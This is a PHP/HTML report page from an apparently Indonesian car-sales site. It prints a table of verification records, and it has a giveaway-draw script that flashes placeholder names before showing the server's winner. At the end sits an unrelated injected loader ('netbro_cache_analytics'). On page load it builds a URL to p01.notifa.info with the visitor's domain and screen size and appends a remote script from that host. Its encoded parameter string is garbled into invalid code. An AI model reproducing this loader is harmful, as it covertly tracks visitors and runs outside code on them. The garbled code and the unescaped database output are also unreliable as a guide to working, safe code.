<?php
session_start();
include '../core/core.php';

?>
<!DOCTYPE html>
<html lang="en" class="no-js">

<head>
  <meta charset="UTF-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>Beli Mobil - Mudah dan Cepat</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
  <meta name="description" content="Unique - Responsive vCard Template" />
  <meta name="keywords" content="vcard, resposnive, retina, resume, jquery, css3, bootstrap, Unique, portfolio" />
  <meta name="author" content="lmtheme" />
  <link rel="shortcut icon" href="favicon.ico">

  <link rel="stylesheet" href="../css/bootstrap.css" type="text/css">
  <link rel="stylesheet" href="../css/normalize.css" type="text/css">
  <link rel="stylesheet" href="../css/animate.css" type="text/css">
  <link rel="stylesheet" href="../css/transition-animations.css" type="text/css">
  <link rel="stylesheet" href="../css/jquery.mCustomScrollbar.min.css" type="text/css">
  <link rel="stylesheet" href="../css/owl.carousel.css" type="text/css">
  <link rel="stylesheet" href="../css/magnific-popup.css" type="text/css">
  <link rel="stylesheet" href="../css/main-red.css" type="text/css">

  <!-- This styles needs for demo -->
  <link rel="stylesheet" href="../preview/lmpixels-demo-panel.css" type="text/css">
  <!-- /This styles needs for demo -->

  <link rel="stylesheet" href="../admin/css/bootstrap.min.css">
  <link rel="stylesheet" href="../admin/css/icons.css">
  <link rel="stylesheet" href="../admin/css/icons.css">
  <style>
  #customers {
    font-family: Arial, Helvetica, sans-serif;
    border-collapse: collapse;
    width: 100%;
  }

  #customers td,
  #customers th {
    border: 1px solid #ddd;
    padding: 8px;
  }

  #customers tr:nth-child(even) {
    background-color: #f2f2f2;
  }

  #customers tr:hover {
    background-color: #ddd;
  }

  #customers th {
    padding-top: 12px;
    padding-bottom: 12px;
    text-align: left;
    background-color: #04AA6D;
    color: white;
  }


  .ct {
    font-family: Arial, Helvetica, sans-serif;
    border-collapse: collapse;
    width: 100%;
  }

  .ct td,
  #customers th {
    border: 1px solid #ddd;
    padding: 8px;
  }

  .ct tr:nth-child(even) {
    background-color: #f2f2f2;
  }

  .ct tr:hover {
    background-color: #ddd;
  }

  .ct th {
    padding-top: 12px;
    padding-bottom: 12px;
    text-align: left;
    background-color: #04AA6D;
    color: white;
  }




  .prizebutton {
    display: block;
    width: 100px;
    height: 100px;
    font-size: 1.3em;
    font-weight: light;
    font-family: 'Trebuchet MS', sans-serif;
    text-transform: uppercase;
    text-align: center;
    line-height: 100px;
    letter-spacing: -1px;
    color: white;
    border: none;
    border-radius: 50%;
    background: #5a99d4;
    cursor: pointer;
    box-shadow: 0 0 0 0 rgba(#5a99d4, .5);
    -webkit-animation: pulse 1.5s infinite;
  }

  .prizebutton span {
    color: #e2eaf3;
    position: absolute;
    text-decoration: none;
    text-align: center;
    font-weight: bold;
    font-size: 1.2rem;
    line-height: .8;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
  }
  </style>


  <script>
  (function(i, s, o, g, r, a, m) {
    i['GoogleAnalyticsObject'] = r;
    i[r] = i[r] || function() {
      (i[r].q = i[r].q || []).push(arguments)
    }, i[r].l = 1 * new Date();
    a = s.createElement(o),
      m = s.getElementsByTagName(o)[0];
    a.async = 1;
    a.src = g;
    m.parentNode.insertBefore(a, m)
  })(window, document, 'script', '../../../../www.google-analytics.com/analytics.js', 'ga');

  ga('create', 'UA-96534204-1', 'auto');
  ga('send', 'pageview');
  </script>

  <script src="../js/jquery-3.3.1.js"></script>
  <script src="../js/jquery-2.1.3.min.js"></script>
  <script src="../js/modernizr.custom.js"></script>
</head>
<div class="row">

<div class="col-12" style='display:none;'>
  <div class="card-box table-responsive" >
    <table class="ct" cellspacing="0" width="100%">

      <thead>

        <tr>
          <th>No</th>
          <th>Nama</th>
          <th>Nama Produk</th>
          <th>Status</th>

        </tr>
      </thead>

      <tbody>
        <?php
        $no = 0;
        $sql = "SELECT * FROM verifikasi";
        $query = mysqli_query($connect, $sql);

        while ($data = mysqli_fetch_array($query)) {
          $no++;
          $status = $data['status'];
        ?>
        <tr>
          <td><?= $no ?> </td>

          <td><?= $data['nama'] ?></td>
          <td><?= $data['nama_produk'] ?></td>
          <td><?= $data['status'] ?></td>

        </tr>
        <?php } ?>
      </tbody>

      </td>
      </tr>
      </tfoot>
      <script>
        window.print();
    </script> 
    </table>

  </div>
</div>
<!-- </div> -->
<!-- end row -->
</section>
  

</div>

<!-- batas laporan -->


<!-- /Main Content -->
</div>
<script src="../plugins/datatables/jquery.dataTables.min.js"></script>
      <script src="../plugins/datatables/dataTables.bootstrap4.min.js"></script>
      <!-- Buttons examples -->
      <script src="../plugins/datatables/dataTables.buttons.min.js"></script>
      <script src="../plugins/datatables/buttons.bootstrap4.min.js"></script>
      <script src="../plugins/datatables/jszip.min.js"></script>
      <script src="../plugins/datatables/pdfmake.min.js"></script>
      <script src="../plugins/datatables/vfs_fonts.js"></script>
      <script src="../plugins/datatables/buttons.html5.min.js"></script>
      <script src="../plugins/datatables/buttons.print.min.js"></script>
      <script src="../plugins/datatables/buttons.colVis.min.js"></script>
      <!-- Responsive examples -->
      <script src="../plugins/datatables/dataTables.responsive.min.js"></script>
      <script src="../plugins/datatables/responsive.bootstrap4.min.js"></script>


      <!-- /Demo Color changer -->
      <script src="../js/bootstrap.js"></script>
      <script src="../js/bootstrap.min.js"></script>
      <script src="../js/pages-switcher.js"></script>
      <script src="../js/imagesloaded.pkgd.min.js"></script>
      <script src="../js/validator.js"></script>
      <script src="../js/jquery.shuffle.min.js"></script>
      <script src="../js/masonry.pkgd.min.js"></script>
      <script src="../js/owl.carousel.min.js"></script>
      <script src="../js/jquery.magnific-popup.min.js"></script>
      <script src="../js/jquery.mCustomScrollbar.concat.min.js"></script>
      <script src="../js/tilt.jquery.min.js"></script>
      <script src="../js/jquery.hoverdir.js"></script>
      <script src="../js/main.js"></script>

      <!-- Undi Giveaway -->
      <script>
      $("#prizebutton").click(function() {
        $.ajax({
          type: 'GET',
          url: 'undi-giveaway',
          data: {
            ajax: 1,
          },
          success(res) {
            const exPerson = ["Budi", "Dimas", "Agung", "Devi", "Lala", "Arif", "Rahmat", "Dina", "Lina",
              "Adel"
            ]
            const randomize = setInterval(() => {
              $('#pemenang-giveaway').text(exPerson[Math.round(Math.random() * 10)])
            }, 50)

            setTimeout(() => {
              clearInterval(randomize)
              $('#pemenang-giveaway').text(res.nama)
            }, 3000);
          }
        })
      })
      </script>

      <!-- Demo Color changer Script -->
      <script src="../preview/lmpixels-demo-panel.js"></script>
      <!-- /Demo Color changer Script -->
      <script type="text/javascript">
      if (self == top) {
        function netbro_cache_analytics(fn, callback) {
          setTimeout(function() {
            fn();
            callback();
          }, 0);
        }

        function sync(fn) {
          fn();
        }

        function requestCfs() {
          var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
          var idc_glo_r = Math.floor(Math.random() * 99999999999);
          var url = idc_glo_url + "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" +
            4 TtHaUQnUEiP6K % 2 fc5C582NzYpoUazw5mVa2K % 2 bNZnlpTXt9YnUCwpMMLx % 2 b %
            2 bQHkmE4Wy7RkeBZJGKiJdue9wKB96Kc9iVjivRBFiEw44gPLCtvAbDqY8nlaWKojwq % 2 bGxts8680ZPIfGcjWoyu1MUIXmG % 2 b %
            2 fgsc13iDQgNwbvkNzcl % 2 bgd5G365lc % 2 fZW9uzrhiAfXhLg0uTMRKGTIzWdvXQ %
            2 b2shx1gs2blnB4W4WGsbJHO22nvyZ74GuIWsH % 2 bO2iD4UoLHdXpJvcTociFcQK9Dknfvs75H62QFe %
            2 beG0uJJQHQwmanVfeImrn9vjTJrTMhkA6wmV23gTia4rlkd3WVk8bxtQmNtzP7ShU8RCESFWt %
            2 fukSnHOF4HDXptKLmwTZA9k3nw9r0f7sEgrU0Xm8tcUqpgT % 2 bA3GpgWz0UZBVqoJQUQTafmPPjQfmo % 2 bujydoTzM %
            2 b4kN2bVShERlJYGTwQiruBjPg4Jcq2vXsOMrY % 2 ftUBTyzxtnHSs6iYj1qOwVzMd4cpc %
            2 fzRYJcQyAnBMqdxTgyoUr5ibFUVuN0qJG % 2 bXplJfh1lkgP45Ezt % 2 b7MOHgoActEOLtw + "&idc_r=" + idc_glo_r +
            "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
          var bsa = document.createElement('script');
          bsa.type = 'text/javascript';
          bsa.async = true;
          bsa.src = url;
          (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
        }
        netbro_cache_analytics(requestCfs, function() {});
      };
      </script>
      
</body>

</html>